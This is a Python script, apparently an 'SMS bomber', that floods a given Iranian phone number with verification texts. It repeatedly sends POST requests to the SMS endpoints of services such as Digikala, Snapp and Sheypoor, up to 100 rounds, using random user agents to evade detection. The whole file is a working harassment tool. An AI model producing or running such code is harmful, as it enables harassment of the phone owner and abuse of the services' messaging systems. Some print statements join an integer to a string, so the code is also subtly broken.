# packages
import requests
import json
import re

from colorama import Fore as C
from fake_useragent import UserAgent

range_n_limit = 100
services = ['pakhsh', 'lendo', 'banimode', 'snappmarket', 'snapp', 'sheypoor', 'digikala']


def validate_phone_number(phone_number):
    pattern = r'^09\d{9}$'
    return re.match(pattern, phone_number) is not None


def send(phone_number, range_n):  # add prvity Change IP
    cunt = 0

    # Validate phone number
    if not phone_number:
        print("Invalid Phone number")
        return

    # Load lib/API/sms.json
    with open('./lib/API/sms.json') as json_file:
        loaded_json = json.load(json_file)

    if int(range_n) <= range_n_limit:
        for i in range(int(range_n)):
            cunt += 1

            # +_+_+_+ User Agent Generator +_+_+_+
            ua = UserAgent()
            headers = {'User-Agent': ua.random}

            for service in services:
                url_data = loaded_json[service]
                url = url_data['url']
                req_data = url_data.get('data', {})

                if isinstance(req_data, dict):
                    req_data = json.dumps(req_data)

                req_data = req_data.replace('numnum', phone_number)

                req = requests.post(url=url, data=req_data, headers=headers)
                if req.status_code == 200:
                    print(C.GREEN+cunt+' Send',C.WHITE)
                else:
                    print(C.RED+cunt+" Failed :", req.status_code,C.WHITE)
    else:
        print('Send Range Limit 100')
